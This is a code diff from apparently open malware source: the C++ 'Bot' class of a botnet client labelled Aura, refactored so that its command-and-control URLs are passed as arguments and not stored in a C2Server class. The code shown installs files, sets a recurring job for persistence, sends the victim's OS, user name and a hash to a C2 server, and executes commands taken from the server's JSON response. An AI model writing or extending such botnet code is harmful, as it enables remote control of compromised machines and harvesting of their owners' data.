@@ -8,38 +8,21 @@
 
 const std::string HASH_TYPE("SHA256");
 
-class C2Server {
-   public:
-    C2Server(const std::string& register_url, const std::string& command_url) {
-        register_url_ = register_url;
-        command_url_ = command_url;
-    }
-
-    std::string GetRegisterUrl() { return register_url_; }
-    std::string GetCommandUrl() { return command_url_; }
-
-   private:
-    std::string register_url_, command_url_;
-};
-
 class Bot {
    public:
-    Bot(const std::string& seed_path, const std::string& register_url,
-        const std::string& command_url) {
+    Bot(const std::string& seed_path) {
         hash_type_ = HASH_TYPE;
         seed_ = std::make_unique<Seed>(seed_path);
-        c2_server_ = std::make_unique<C2Server>(register_url, command_url);
     }
 
     void Init();
     bool IsInit();
-    void RegisterBot();
-    void ExecuteCommand();
+    void RegisterBot(const std::string& register_url);
+    void ExecuteCommand(const std::string& command_url);
 
    private:
     std::string hash_type_, hash_sum_, os_, user_;
     std::unique_ptr<Seed> seed_;
-    std::unique_ptr<C2Server> c2_server_;
 
     void PrepareSysInfo_();
 };
@@ -48,13 +31,12 @@ void Bot::Init() {
     // Install files and components
     install::InstallFiles();
     seed_->InitSeed();
-    RegisterBot();
     install::InitRecurringJob();
 }
 
 bool Bot::IsInit() { return seed_->Exists(); }
 
-void Bot::RegisterBot() {
+void Bot::RegisterBot(const std::string& register_url) {
     // Register bot with C2 server
     PrepareSysInfo_();
     request::PostForm post_form;
@@ -63,20 +45,19 @@ void Bot::RegisterBot() {
     post_form.AddField("hash_sum", hash_sum_);
     post_form.AddField("operating_sys", os_);
     post_form.AddField("user", user_);
-    request::Post(c2_server_->GetRegisterUrl(), post_form.ToString());
+    request::Post(register_url, post_form.ToString());
 }
 
-void Bot::ExecuteCommand() {
+void Bot::ExecuteCommand(const std::string& command_url) {
     // Update system info and create POST form
     PrepareSysInfo_();
     request::PostForm post_form;
     post_form.AddField("version", AURA_VERSION);
     post_form.AddField("hash_sum", hash_sum_);
 
-    std::string response =
-        request::Post(c2_server_->GetCommandUrl(), post_form.ToString());
+    std::string response = request::Post(command_url, post_form.ToString());
 
-    // Parse response and execute based on JSON data
+    // Parse response from C2 server and execute based on JSON data
     Command cmd(response);
     cmd.Execute();
 }
